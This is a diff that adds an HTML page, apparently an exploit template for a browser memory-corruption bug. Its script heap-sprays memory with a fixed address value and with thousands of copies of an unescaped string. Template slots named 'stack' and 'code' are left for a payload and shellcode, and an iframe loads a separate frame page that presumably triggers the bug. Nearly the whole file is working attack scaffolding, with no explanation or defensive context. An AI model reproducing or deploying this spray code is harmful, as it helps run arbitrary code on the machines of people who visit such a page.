@@ -1,0 +1,46 @@
+<html>
+    <head>
+        <script>
+            function sprayOne(mem, size, v) {
+                var a = new Uint32Array(size - 20);
+                for (var j = 0; j < a.length; j++) a[j] = v;
+                var t = document.createTextNode(String.fromCharCode.apply(null, new Uint32Array(a)));
+                mem.push(t);
+            }
+            function sprayInc(n) {              
+{{ stack }}
+
+                var h1 = [];
+                h1[0] = str.substring(0, str.length);
+                
+                for (i = 1; i <= n; i++)
+                    h1[i] = unescape(h1[0]);
+                    
+                return h1;
+            }
+            
+            function sprayCode(n) {              
+{{ code }}
+
+                var h1 = [];
+                h1[0] = str.substring(0, str.length);
+                
+                for (i = 1; i <= n; i++)
+                    h1[i] = unescape(h1[0]);
+                    
+                return h1;
+            }            
+
+            function dsm(evnt) {
+                // spray
+                var mem = [];
+                for (var j = 20; j < 2048; j++) sprayOne(mem, j, 0x1dd7b814);
+            }
+            var pointer = sprayInc(25000);
+            var code = sprayCode(300);
+        </script>
+    </head>
+    <body>
+        <iframe src="frame.html"></iframe>
+    </body>
+</html>
